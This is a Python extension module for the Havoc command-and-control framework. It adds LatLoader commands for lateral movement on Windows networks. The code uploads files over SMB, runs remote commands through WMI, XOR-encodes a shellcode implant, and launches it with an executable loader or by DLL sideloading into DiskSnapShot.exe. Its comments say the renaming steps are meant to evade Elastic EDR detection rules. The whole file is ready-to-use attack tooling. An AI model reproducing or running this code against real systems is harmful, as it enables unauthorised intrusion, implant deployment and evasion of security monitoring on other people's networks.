from havoc import Demon, RegisterCommand, RegisterModule
import re, time, string, random

# Change this to match the key used in the loaders. Or maybe make modifications to dymaically generate a random key each time. ;)
XOR_KEY = "OPERATORCHANGEMEPLZZZ"

class WmiPacker:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8" )
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addWstr(self, s):
        s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size += calcsize(fmt)

    def addbytes(self, b):
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addbool(self, b):
        fmt = '<I'
        self.buffer += pack(fmt, 1 if b else 0)
        self.size += calcsize(fmt)

    def adduint32(self, n):
        fmt = '<I'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

    def addshort(self, n):
        fmt = '<h'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

def xorencode(infile, key, outfile):
    # Generate key if one is not supplied
    if key == "" or key == None:
        letters = string.ascii_letters + string.digits
        key = ''.join(random.choice(letters) for i in range(49))
    # read input file as raw bytes    
    file = open(infile, 'rb')
    contents = file.read()
    file.close()
    # initialize encrypted byte array
    encoded = []
    for b in range(len(contents)):
        test = contents[b] ^ ord(key[b % len(key)])
        #hex_formated.append("{:02x}".format(test)) # store as each byte as hex string in array
        encoded.append(test)

    file = open(outfile, "wb")
    file.write(bytes(encoded))
    file.close()

    print(f"[+] File encoded successfully! Saved to: {outfile}")
    print(f"[+] Here is your key: {key}")

def smb_writefile( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = WmiPacker()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    print(f"[debug] [rupload] type(params[0]): {type(params[0])}")
    if type(params[0]) == tuple:
        params = params[0]
    params = params[1:]
    num_params = len(params)
    print(f"[debug] [rupload] params2: {params}")

    target = params[0]
    is_current = False

    f = open(params[1], "rb")
    fileBytes = f.read()
    f.close()

    remotePath = params[2].split(":")[1]

    packer.addstr(target)
    packer.addstr(remotePath)
    packer.adduint32(len(fileBytes))
    packer.addstr(fileBytes)
    #print(fileBytes[0:10])

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to copy {params[1]} to {remotePath} on {target} via SMB")

    demon.InlineExecute( TaskID, "go", f"bin/writefileBOF.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def wmi_proccreate( demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = WmiPacker()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    print(f"[debug] [exec] type(params[0]): {type(params[0])}")
    if type(params[0]) == tuple:
        params = params[0]
    print(f"[debug] [exec] params1: {params}")
    params = params[1:] # required if params are passed directly as *params
    num_params = len(params)
    print(f"[debug] [exec] params2: {params}")

    target     = ''
    username   = ''
    password   = ''
    domain     = ''
    command    = ''
    is_current = False

    if num_params < 2:
        print(f"[debug] [exec] num_params1: {num_params}")
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    target  = f'\\\\{params[ 0 ]}\\ROOT\\CIMV2'
    command = params[ 1 ]

    if num_params > 2 and num_params < 5:
        print(f"[debug] [exec] num_params: {num_params}")
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params == 6:
        is_current = False
        username = params[ 2 ]
        password = params[ 3 ]
        domain   = params[ 4 ]

    packer.addWstr(target)
    packer.addWstr(domain)
    packer.addWstr(username)
    packer.addWstr(password)
    packer.addWstr(command)
    packer.addbool(is_current)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run {command} on {target} via wmi" )

    demon.InlineExecute( TaskID, "go", f"bin/ProcCreate.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def load(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = WmiPacker()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    print(f"[debug] [load] params: {params}")
    #params = params[1:]
    num_params = len(params)
    print(params)
    targetHost = params[1]
    targetFile = params[2]

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Perfoming lateral movement with provided exe..." )

    newParams = ("rupload", targetHost, targetFile, "C:\\Windows\\Temp\\load.exe")
    smb_writefile(demonID, newParams)

    newParams = ("load", targetHost, "cmd.exe /c C:\\Windows\\Temp\\load.exe")
    wmi_proccreate(demonID, newParams)

    return TaskID

def xorload(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = WmiPacker()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    print(f"[debug] [load] params: {params}")
    #params = params[1:]
    num_params = len(params)
    print(params)
    targetHost = params[1]
    demonFile = params[2]

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Perfoming lateral movement with xor shellcode loader..." )

    # xor encode provided raw shellcode file
    xorencode(demonFile, XOR_KEY, "bin/xordemon.bin")

    newParams = ("rupload", targetHost, "bin/xordemon.bin", "C:\\Windows\\image02.png")
    smb_writefile(demonID, newParams)

    newParams = ("rupload", targetHost, "bin/loader.exe", "C:\\Windows\\load.exe")
    smb_writefile(demonID, newParams)

    newParams = ("load", targetHost, "cmd.exe /c C:\\Windows\\load.exe")
    wmi_proccreate(demonID, newParams)

    return TaskID

def sideload(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = WmiPacker()
    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    print(f"[debug] [load] params: {params}")
    #params = params[1:]
    num_params = len(params)
    print(params)
    targetHost = params[1]
    demonFile = params[2]

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Perfoming lateral movement with xor shellcode loader via DLL sideloading..." )

    # xor encode provided raw shellcode file
    xorencode(demonFile, XOR_KEY, "bin/xordemon.bin")

    # Write to dll sideloader to target location
    newParams = ("rupload", targetHost, "bin/signed_sideloader.dll", "C:\\Windows\\cryptbase.png")
    smb_writefile(demonID, newParams)

    # Change cryptbase extension via WMI, avoiding elastic "Lateral Tool via SMB" alert
    newParams = ("load", targetHost, "cmd.exe /c copy C:\\Windows\\cryptbase.png C:\\Windows\\cryptbase.dll && echo --path C:\\Windows\\CCMCache\\cache")
    wmi_proccreate(demonID, newParams)

    # upload xor encoded demon to target location
    newParams = ("rupload", targetHost, "bin/xordemon.bin", "C:\\Windows\\image02.png")
    smb_writefile(demonID, newParams)

    # Move write.exe to directory containing dll
    newParams = ("load", targetHost, "cmd.exe /c copy C:\\Windows\\System32\\DiskSnapShot.exe C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache")
    wmi_proccreate(demonID, newParams)

    # Execute shellcode loader via DLL sideloading cryptbase.dll into DiskSnapShot.exe
    newParams = ("load", targetHost, "cmd.exe /c C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache")
    wmi_proccreate(demonID, newParams)

    return TaskID


RegisterModule( "LatLoader", "Laterally move via WMI using a simple shellcode loader", "", "[subcommand] (args)", "", ""  )
RegisterCommand( smb_writefile, "LatLoader", "rupload", "Upload a file over SMB", 0, "target local_file remote_path", "dc1 /root/test.exe C:\\Windows\\Temp\\test.exe")
RegisterCommand( wmi_proccreate, "LatLoader", "exec", "Execute a file or command via WMI", 0, "target command", "dc1 \"cmd.exe /c whoami > C:\\poc3.txt\"" )
RegisterCommand( load, "LatLoader", "load", "Upload file over SMB and execute it via WMI", 0, "target local_file", "dc1 /root/test.exe")
RegisterCommand( xorload, "LatLoader", "xorload", "Perform lateral movement using a simple shellcode loader", 0, "target raw_demon_file", "dc1 /root/demon.x64.bin")
RegisterCommand( sideload, "LatLoader", "sideload", "Perform lateral movement by DLL sideloading a simple shellcode loader with evasions for Elastic EDR rules", 0, "target raw_demon_file", "dc1 /root/demon.x64.bin")
